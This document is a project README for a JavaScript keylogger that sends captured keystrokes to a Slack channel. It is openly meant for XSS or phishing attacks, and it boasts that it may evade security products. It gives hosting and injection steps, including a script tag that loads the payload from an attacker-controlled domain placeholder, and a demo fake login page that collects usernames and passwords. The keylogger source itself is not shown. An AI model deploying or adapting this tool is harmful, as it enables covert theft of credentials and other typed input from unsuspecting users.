# JS_KeyLogger_to_Slack
To be used with XSS or Phishing to Get Real-Time Keyboard Input Without Waiting for or Controlling Form Submission!

# Description
I wanted to improve upon my XSS API by adding support for capturing all keystrokes by the end user and sending them to a Slack channel for real time monitoring.  This allows for a quicker response to phishing attacks and more information than what's provided by POSTing an HTML form.  It's also more simple that BeEF so it hopefully won't get picked up by any security products!  Because we don't want to flood the Slack Channel or API by submitting each character at a time, we wait until the "Enter/Return" key is pressed or at Mouse click.  I figure this is most likely after a user is finished entering data into an input field somewhere on the page.

# Instructions

Simply host the Keylogger client-side JavaScript (kl.js) on a webserver that's publicly accessible, or embed it directly within your HTML.  If hosting it, simply call it like you would any JS with `<script src="https://YOUR_DOMAIN_HERE/kl.js"></script>`.

Host the Keylogger server-side PHP API (kl.php) on your web server and be sure to edit the variables to point to your Slack Channel via a Webhook.

# Demo

Test it out with something as simple as this : 

```
<HTML>
<BODY>
<SCRIPT SRC="https://YOUR_DOMAIN_HERE/kl.js">
</SCRIPT>
<CENTER>
<H2>JS Phishing/XSS Keylogger to Slack!</H2>
<B>Note: </B>Try typing anywhere and then click the mouse or hit Enter/Return on your keyboard
<BR><BR>
<TABLE>
<TR><TH>Username</TH><TH>Pass</TH></TR>
<TR><TD><INPUT TYPE="text" VALUE="" NAME="User"></TD><TD><INPUT TYPE="password" VALUE="" NAME="Pass"></TD></TR>
</TABLE>
<BUTTON TYPE="button">SUBMIT</BUTTON>
</CENTER>
</BODY>
</HTML>
```


<p align="center"><img align="center" alt="Client Example" src="https://s22.postimg.cc/nk5u28dep/Capture.png">
  <b><br>Figure 1: Client Example</b></p><br><br>



<p align="center"><img align="center" width="400" alt="Watching in Slack" src="https://s22.postimg.cc/4rtyynoq9/Capture2.png">
<b><br>Figure 2: Watching in Slack</b></p>
